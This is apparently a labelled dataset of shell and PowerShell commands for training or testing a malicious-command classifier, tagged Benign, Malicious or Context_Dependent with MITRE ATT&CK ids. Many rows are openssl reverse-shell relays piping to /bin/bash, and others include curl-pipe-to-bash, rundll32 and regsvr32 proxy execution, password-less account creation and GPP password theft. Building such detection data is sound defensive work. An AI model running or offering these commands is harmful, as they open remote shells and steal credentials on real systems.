command,label,original_label,mitre_id
openssl s_client -quiet -connect 192.168.1.100:3389 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
"{{echo -n '{""name"":""My Folder1""}' | base64}} | bw create folder",Benign,Benign,Benign
chmod +x pretty-print,Benign,Benign,Benign
scrcpy [-r|--record] path/to/file.mp4,Benign,Benign,Benign
pw-container [-r|--remote] remote_instance_name command,Benign,Benign,Benign
rfkill unblock bluetooth|wifi|gps|nfc|...,Benign,Benign,Benign
shopt -u option_name,Benign,Benign,Benign
"d8 -e ""code""",Benign,Benign,Benign
gh browse [-s|--settings],Benign,Benign,Benign
cheat [-v|--version],Benign,Benign,Benign
fx --yaml path/to/file.yaml,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:9001,Malicious,Synthetic,Synthetic
find $PWD -type f -exec ln -st $tmpdir {} +,Benign,Benign,Benign
composer audit vendor/package,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:995,Malicious,Synthetic,Synthetic
x package,Benign,Benign,Benign
tcpdump -i enp0s3 -w /tmp/.upd,Context_Dependent,Synthetic,Synthetic
command | sed -n '1p',Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:110,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:995 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:8081,Malicious,Synthetic,Synthetic
kopia policy set --global --add-ignore path/to/file_or_folder,Benign,Benign,Benign
keepassxc-cli rm path/to/database_file entry_name,Benign,Benign,Benign
tailscale funnel path/to/file_or_directory,Benign,Benign,Benign
openvpn3 sessions-list,Benign,Benign,Benign
tcpdump -i ens160 -c 8443,Context_Dependent,Synthetic,Synthetic
cargo [t|test] [-p|--package] package,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:6379,Malicious,Synthetic,Synthetic
npm outdated,Benign,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:22,Malicious,Synthetic,Synthetic
"New-LocalUser -Name ""$username"" -NoPassword",Malicious,Malicious,T1136
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 172.16.0.10:8888,Malicious,Synthetic,Synthetic
"xidel https://www.google.com/search?q=test [-e|--extract] ""//a/extract(@href, 'url[?]q=([^&]+)&', 1)[. != '']""",Benign,Benign,Benign
mongodump [-o|--out] path/to/directory,Benign,Benign,Benign
[[ $(find /path/to/file -type f -size +51200c 2>/dev/null) ]] && echo true || echo false,Benign,Benign,Benign
tcpdump -i eth0 -c 445,Context_Dependent,Synthetic,Synthetic
file /bin/pwd,Context_Dependent,Malicious,T1083
"swaks [-t|--to] user@example.com [-f|--from] me@example.com [-a|--auth] CRAM-MD5 [-au|--auth-user] me@example.com --header-X-Test ""test_email""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.10.10.10:5432 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
"say --voice ""?""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:8888,Malicious,Synthetic,Synthetic
fwupdmgr get-history,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.10:80 admin@10.0.0.25,Context_Dependent,Synthetic,Synthetic
find . -mtime 4 -daystart -exec cp -a {} /home/devnet/fileshare\$ on\ X.X.X.X/RECOVER/ \;,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:9001,Malicious,Synthetic,Synthetic
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders,Malicious,Malicious,T1060
tcpdump -i ens33 -c 8443,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:80,Malicious,Synthetic,Synthetic
expand path\to\file.cab path\to\directory -i,Benign,Benign,Benign
.vgz,Malicious,Malicious,T1505
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:9002,Malicious,Synthetic,Synthetic
pipenv,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:143,Malicious,Synthetic,Synthetic
kubectl kustomize path/to/directory > output.yaml,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:53,Malicious,Synthetic,Synthetic
sshuttle -r audit@192.168.1.254 10.0.0.8/24,Context_Dependent,Synthetic,Synthetic
systemctl status sshd,Context_Dependent,Synthetic,Synthetic
"Write-Host ""Registry value deleted: $registryValueName""",Malicious,Malicious,T1562
tcpdump -i eth0 dst 172.16.0.25,Context_Dependent,Synthetic,Synthetic
bshell --vnc,Benign,Benign,Benign
"numactl --cpunodebind=0 --membind=0,1 -- command command_arguments",Benign,Benign,Benign
hdiutil detach /Volumes/volume_file,Benign,Benign,Benign
scalafmt --config path/to/.scalafmt.conf --test,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:8443,Malicious,Synthetic,Synthetic
rdiff-backup restore path/to/backup path/to/destination,Benign,Benign,Benign
sudo mkfs.btrfs /dev/sdXY,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.10:53 postgres@example.com,Context_Dependent,Synthetic,Synthetic
sudo iftop -n,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:3389 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
tcpdump -i ens33 port 1433,Context_Dependent,Synthetic,Synthetic
gomi --prune 1d|1w|1m|1y|...,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:9002,Malicious,Synthetic,Synthetic
basename $0,Benign,Benign,Benign
"else: import SimpleHTTPServer as s, SocketServer as ss",Malicious,Malicious,T1105
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4444,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
docker compose up --build,Benign,Benign,Benign
vagrant status name|id,Benign,Benign,Benign
einfo -dbs,Benign,Benign,Benign
lstopo --no-factorize,Benign,Benign,Benign
sshuttle -r admin@payload.c2 0/0,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:995 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:8443,Malicious,Synthetic,Synthetic
x_x [-d|--delimiter] ';' [-q|--quotechar] '|' file.csv,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
i2cget i2cbus device_address register_address,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:443,Malicious,Synthetic,Synthetic
tldr print.zsh,Benign,Benign,Benign
"awk '{for(i=3;i<=NF;i++){print $1,$2,$i}}' file | column -t",Benign,Benign,Benign
find -L /home/peter -name *~ -exec rm '{}' \;,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:53,Malicious,Synthetic,Synthetic
iverilog -o path/to/executable -tvvp path/to/source.v,Benign,Benign,Benign
picttoppm [-fu|-fullres] path/to/file.pict > path/to/file.ppm,Benign,Benign,Benign
Get-GPPPassword -Verbose,Malicious,Malicious,T1552
findmnt LABEL=BigStorage,Benign,Benign,Benign
godoc -http=:6060 -index -index_files=path/to/file,Benign,Benign,Benign
Get-PassPol,Context_Dependent,Malicious,T1201
openssl s_client -quiet -connect 192.168.1.254:5432 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
sshuttle -r user@10.0.0.1 192.168.1.25/24,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:143 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:8081,Malicious,Synthetic,Synthetic
hg add path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:445,Malicious,Synthetic,Synthetic
neomutt -a path/to/file1 path/to/file2 ... -- recipient@example.com,Benign,Benign,Benign
pkgctl diff [-d|--diffoscope] path/to/file|pkgname,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:1433,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:993 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8080,Malicious,Synthetic,Synthetic
knife role edit role_name,Benign,Benign,Benign
hunspell path/to/file,Benign,Benign,Benign
find / -user 999 -exec chown NEWUSER {} \;,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:1433,Malicious,Synthetic,Synthetic
bzip2 -t file.bz2,Benign,Benign,Benign
"trivy image [-f|--format] template [-t|--template] ""@sarif.tpl"" [-o|--output] path/to/report.sarif image:tag",Benign,Benign,Benign
"paste tmp/sample-XXXX.{tim,log}",Benign,Benign,Benign
biff time add -1d|1d|1w|-1m|1y|... now,Benign,Benign,Benign
tcpdump -i wlan0 -c 4444,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:6379,Malicious,Synthetic,Synthetic
chainctl update,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:22,Malicious,Synthetic,Synthetic
ssh-keyscan -p port hostname,Benign,Benign,Benign
vagrant halt [-f|--force],Benign,Benign,Benign
msgfmt path/to/file.po [-o|--output-file] path/to/file.mo,Benign,Benign,Benign
find lpi104-6 research/lpi104-6 -type l,Benign,Benign,Benign
dcg,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4444,Malicious,Synthetic,Synthetic
boot jar,Benign,Benign,Benign
live-server,Benign,Benign,Benign
"date -j -f ""%a %b %d %H:%M:%S %Y %z"" ""Sat Aug 09 13:37:14 2014 +1100""",Benign,Benign,Benign
gst-launch-1.0 [-e|--eos-on-shutdown] pipewiresrc ! opusenc ! oggmux ! filesink location=path/to/file.ogg,Benign,Benign,Benign
kubeadm upgrade plan,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:110 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8443,Malicious,Synthetic,Synthetic
aws-google-auth [-u|--username] example@example.com [-I|--idp-id] $GOOGLE_IDP_ID [-S|--sp-id] $GOOGLE_SP_ID [-d|--duration] 3600,Benign,Benign,Benign
uuid -d uuid,Benign,Benign,Benign
java -jar jenkins-cli.jar -s jenkins_server_url -auth username:api_token,Benign,Benign,Benign
systemctl is-enabled postgresql,Context_Dependent,Synthetic,Synthetic
pkgstats [-h|--help],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:110,Malicious,Synthetic,Synthetic
blender [-b|--background] path/to/file.blend [-o|--render-output] //output_directory [-f|--render-frame] JPEG [-f|--render-frame] -2,Benign,Benign,Benign
py-spy record [-o|--output] path/to/profile.svg [-p|--pid] pid,Benign,Benign,Benign
systemctl list-unit-files --state=enabled,Context_Dependent,Synthetic,Synthetic
tracepath 10.10.10.10,Context_Dependent,Synthetic,Synthetic
"findstr /i ""string1 string2 ..."" *",Benign,Benign,Benign
ansible group [-m|--module-name] setup,Benign,Benign,Benign
sshuttle -r jenkins@192.168.0.50 10.0.0.0/24,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.1:80 deploy@10.0.0.25,Context_Dependent,Synthetic,Synthetic
"find . -iname ""*.mov"" -printf ""%p %f\n"" | xargs -r -n2 ffmpeg -f flv -i",Benign,Benign,Benign
unset array[$RANDOM%4],Benign,Benign,Benign
"read -p "" Again? Y/n "" i",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:6379,Malicious,Synthetic,Synthetic
"find ""$musicdir"" -type f -print | egrep -i '\.(mp3|aif*|m4p|wav|flac)$'",Benign,Benign,Benign
Get-AcceptedDomain,Malicious,Malicious,T1482
find /etc/ -user root -mtime 1,Benign,Benign,Benign
xcodes runtimes install runtime_name,Benign,Benign,Benign
pngcrush -rem allb -brute -reduce in.png out.png,Benign,Benign,Benign
"who | awk '{ print $1; }' | sort -u | awk '{print $1; u++} END{ print ""users: "" u}'",Context_Dependent,Benign,Benign
cointop,Benign,Benign,Benign
cat file | column -c 80,Benign,Benign,Benign
obabel path/to/file.mol -O path/to/output_file.xyz,Benign,Benign,Benign
uv remove --optional extra_name package,Benign,Benign,Benign
echo -e 'x:\n\t/bin/sh 1>&0 2>&0' >/path/to/temp-file,Malicious,Malicious,T1059
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4444,Malicious,Synthetic,Synthetic
fastmod --accept-all --print-changed-files --fixed-strings exact_string replacement,Benign,Benign,Benign
find /dir/containing/unsigned -name '*.pdf' -print0,Benign,Benign,Benign
ignite remove plugin_name,Benign,Benign,Benign
gvmap -c 1|2|3|... graph.gv -o output.xdot,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:443,Malicious,Synthetic,Synthetic
go fmt path/to/package,Benign,Benign,Benign
cotton -u base_url -s path/to/file.md,Benign,Benign,Benign
/altvba,Malicious,Malicious,T1137
find dir2 ! -type d |xargs wc -c,Benign,Benign,Benign
regsvr32.exe /s {PATH:.dll},Malicious,Malicious,T1218
until ssh username@host; do sleep 2; done,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile,Malicious,Malicious,T1562
srvdll.dll,Malicious,Malicious,T1036
openssl s_client -quiet -connect 192.168.1.1:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4444,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:4445,Malicious,Synthetic,Synthetic
docker stats --no-stream,Benign,Synthetic,Synthetic
gcloud init,Benign,Benign,Benign
"Set-Service -Name hostname -DisplayName ""name""",Benign,Benign,Benign
ssh-keygen -p -f ~/.ssh/filename,Benign,Benign,Benign
clamscan [-d|--database] path/to/database_file_or_directory,Benign,Benign,Benign
tail -20 /etc/environment,Context_Dependent,Synthetic,Synthetic
wget2 [-c|--continue] https://example.com,Benign,Benign,Benign
/var/cron/tabs/,Malicious,Malicious,T1053
ssh -fN -L 8080:10.0.0.5:80 jenkins@example.com,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:5432,Malicious,Synthetic,Synthetic
find . -type f -print0 | xargs -0 -n1 -P4 bzip2,Benign,Benign,Benign
CGEventTap,Malicious,Malicious,T1056
conda activate --stack myenv,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:4445,Malicious,Synthetic,Synthetic
"rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.url}",Malicious,Malicious,T1218
pdftotext texput.pdf -,Context_Dependent,Malicious,T1005
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:143,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:993,Malicious,Synthetic,Synthetic
"find /home/*/public_html/ -type f -iwholename ""*/wp-includes/version.php"" -exec grep -H ""\$wp_version ="" {} \;",Context_Dependent,Benign,Benign
eog path/to/image.png,Benign,Benign,Benign
tldr paste,Benign,Benign,Benign
"echo ""luke;yoda;leila"" | tr "";"" ""\n""",Benign,Benign,Benign
choco pin remove [-n|--name] package,Benign,Benign,Benign
phive remove alias|url,Benign,Benign,Benign
systool -b bus -D,Benign,Benign,Benign
cat /etc/passwd |grep nobody,Malicious,Malicious,T1078
ssh -w 0:0 operator@192.168.1.10,Context_Dependent,Synthetic,Synthetic
jar cf file.jar *,Benign,Benign,Benign
standard --fix,Benign,Benign,Benign
"Write-Host ""Deploying AWS infrastructure... "" -NoNewLine",Malicious,Malicious,T1567
kubens,Benign,Benign,Benign
sudo chmod +x /etc/rc.local,Malicious,Malicious,T1037
audacious [-H|--headless],Benign,Benign,Benign
i3status,Benign,Benign,Benign
tcpdump -i eth0 src 10.0.0.100,Context_Dependent,Synthetic,Synthetic
addr2line [-e|--exe] path/to/executable [-f|--functions] address,Benign,Benign,Benign
"cat afile | split -l 2 --filter='bzip2 > ""$FILE.bz2""'",Benign,Benign,Benign
pigz [-l|--list] archive.tar.gz,Benign,Benign,Benign
pixterm path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.1:8888 audit@10.20.30.40,Context_Dependent,Synthetic,Synthetic
tcpdump -i ens33 -c 100,Context_Dependent,Synthetic,Synthetic
xfce4-terminal --tab,Benign,Benign,Benign
lt [-p|--port] 8000,Benign,Benign,Benign
"""c:\Program Files\Wireshark\tshark.exe"" -i $interface -c 5",Context_Dependent,Malicious,T1040
openssl s_client -quiet -connect 192.168.0.5:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
bacon,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.5:995 support@internal.corp,Context_Dependent,Synthetic,Synthetic
apptainer delete --library https://library.example.com library://user/collection/container:tag,Benign,Benign,Benign
redshift -g red:green:blue,Benign,Benign,Benign
eth0,Malicious,Malicious,T1205
"find -maxdepth 1 -not -iname ""MyCProgram.c""",Benign,Benign,Benign
grub-bios-setup [-d|--directory] /boot/grub /dev/sdX,Benign,Benign,Benign
"su -c ""cd /tmp; curl -s $remote_url | bash"" art",Malicious,Malicious,T1110
pueue enqueue task_id task_id,Benign,Benign,Benign
"find / -maxdepth 1 -xdev -type f -exec grep -Zli ""stringtofind"" {} + | parallel -0 sed ""'/./d'"" '{}'",Context_Dependent,Benign,Benign
tail -20 /etc/motd,Context_Dependent,Synthetic,Synthetic
steamos-select-branch beta,Benign,Benign,Benign
magick montage path/to/image1.jpg path/to/image2.jpg ... path/to/montage.jpg,Benign,Benign,Benign
avrdude -p part_no -c programmer -U flash:w:file.hex,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:3306 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:8081,Malicious,Synthetic,Synthetic
bitwise 0x563d,Benign,Benign,Benign
Install-Module module -MinimumVersion minimum_version -MaximumVersion maximum_version,Benign,Benign,Benign
john --list=formats,Benign,Benign,Benign
pro security-status --unavailable,Benign,Benign,Benign
"find . -type f -name ""*cache.html"" -exec sh -c ""gzip < {} > {}.gz"" \;",Benign,Benign,Benign
git undo,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9090 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:9002,Malicious,Synthetic,Synthetic
"ippeveprinter -s speed ""service_name""",Benign,Benign,Benign
cordova info,Benign,Benign,Benign
mvn site [-D|--define] skipTests,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:3389,Malicious,Synthetic,Synthetic
lsattr -R,Benign,Benign,Benign
pw-mon [-r|--remote] remote_name,Benign,Benign,Benign
git sed 'find_text' 'replace_text',Benign,Benign,Benign
kubectl auth can-i '*' '*' [-n|--namespace] namespace,Context_Dependent,Benign,Benign
ytmdl song_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:53 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
ip link show,Benign,Synthetic,Synthetic
sudo compsize path/to/file_or_directory,Benign,Benign,Benign
strace -e trace=file -p 4444,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:110,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:3306 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:22,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:8081,Malicious,Synthetic,Synthetic
bitcoin-cli generate num_blocks,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:22,Malicious,Synthetic,Synthetic
"if [ -f ""/etc/$auditd_config_file_name"" ];",Malicious,Malicious,T1562
ssh -w 0:0 jenkins@support.internal,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:6379,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:3306 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:80,Malicious,Synthetic,Synthetic
git mailinfo -k message|patch,Benign,Benign,Benign
grep -r 'password' /opt/,Context_Dependent,Synthetic,Synthetic
gopass new,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8080,Malicious,Synthetic,Synthetic
"grep -Ril ""text-to-find-here"" /",Benign,Benign,Benign
ng update package,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:8443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:110,Malicious,Synthetic,Synthetic
"docker [ps|container ls] [-f|--filter] ""status=status""",Benign,Benign,Benign
systemctl status apache2,Context_Dependent,Synthetic,Synthetic
gpclient launch-gui,Benign,Benign,Benign
logrotate path/to/logrotate.conf --force,Benign,Benign,Benign
diff -u file1 file2,Benign,Benign,Benign
docker [logs|container logs] [-f|--follow] container_name,Benign,Benign,Benign
"cscript.exe /E:Jscript ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""",Malicious,Malicious,T1547
sudo aa-cleanprof [-s|--silent] profile_name,Benign,Benign,Benign
find / -size +10M -printf “%12s %t %h/%fn”,Context_Dependent,Benign,Benign
ibmcloud help,Benign,Benign,Benign
Clear-RecycleBin -Force,Benign,Benign,Benign
cat infile | od -c,Benign,Benign,Benign
conda doctor [-p|--prefix] path/to/environment,Benign,Benign,Benign
tcpdump -i wlan0 -w /tmp/.svc,Context_Dependent,Synthetic,Synthetic
x11vnc -shared,Benign,Benign,Benign
cmd.exe /c %s,Malicious,Malicious,T1059
"wuauclt.exe /UpdateDeploymentProvider ""$arbitrary_dll"" /RunHandlerComServer",Malicious,Malicious,T1218
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8080,Malicious,Synthetic,Synthetic
qmv [-o|--option] swap *.jpg,Benign,Benign,Benign
fastapi --help,Benign,Benign,Benign
bun build path/to/entry.ts --outfile path/to/output.js --sourcemap,Benign,Benign,Benign
ned [-R|--recursive] --exclude '*.htm' '^[dl]og' .,Benign,Benign,Benign
traceroute -n 10.0.0.8,Context_Dependent,Synthetic,Synthetic
transmission-edit [-d|--delete] http://example.com path/to/file.torrent,Benign,Benign,Benign
"exif --ifd 0 [-t|--tag] ""Model"" [-m|--machine-readable] path/to/image.jpg",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4444,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
tifftopnm [-h|-headerdump] path/to/input_file.tiff > path/to/output_file.pnm,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.8:8080 admin@assets-dropper.net,Context_Dependent,Synthetic,Synthetic
"rundll32.exe url.dll,FileProtocolHandler {PATH_ABSOLUTE:.exe}",Malicious,Malicious,T1218
ssh -fN -L 8080:10.0.0.100:8080 user@10.0.0.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:53 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:9002,Malicious,Synthetic,Synthetic
